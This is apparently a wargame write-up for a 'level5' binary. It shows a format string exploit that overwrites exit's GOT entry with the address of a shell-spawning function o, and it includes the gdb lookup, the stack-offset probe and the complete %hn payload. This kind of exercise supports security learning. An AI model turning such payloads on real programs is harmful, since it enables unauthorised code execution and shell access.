we found in the source that if we call the o function, we will get access to a shell
like before, we will use a format string vulnerability.

0x080484a4 -> \xa4\x84\x04\x08 -> address of o, so like the previous level, we want to divide the address in two parts :
0x0804 is 2052 in decimal
0x84a4 is 33956 in decimal

we find the positions of our input data on the stack with :
python -c 'print "AAAABBBB" + "%4$p %5$p"' | ./level5

we will replace the address of exit with the address of the o function so the program will jump to it
when we examine the instruction at the memory address found with info function exit in gdb :
x/i 0x080483d0
<exit@plt>:	jmp	*0x8049838
this is the real address of exit (and exit + 2 is 0x0804983a), we can now write the address of the function o with this payload :

(python -c 'print "\x38\x98\x04\x08\x3a\x98\x04\x08" + "%2044x%5$hn%31904x%4$hn"' ; cat) | ./level5
